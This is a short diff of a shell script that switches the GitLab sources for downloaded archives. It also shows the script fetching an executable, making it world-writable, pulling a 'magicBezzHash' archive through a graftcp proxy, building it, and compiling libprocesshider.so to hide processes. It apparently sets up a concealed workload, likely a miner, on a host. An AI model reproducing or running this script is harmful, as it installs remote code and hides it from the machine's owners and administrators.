@@ -17,7 +17,7 @@ wget wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.83
 
 chmod 777 lol1.83
 
-wget https://gitlab.com/ubedx/ngopi/-/raw/main/graphics.tar.gz
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
@@ -50,7 +50,7 @@ echo " "
 echo " "
 
 
-./graftcp/graftcp wget https://gitlab.com/ubedx/ngopi/-/raw/main/magicBezzHash.zip
+./graftcp/graftcp wget https://gitlab.com/majapahlevi/mvp/-/raw/main/magicBezzHash.zip
 unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
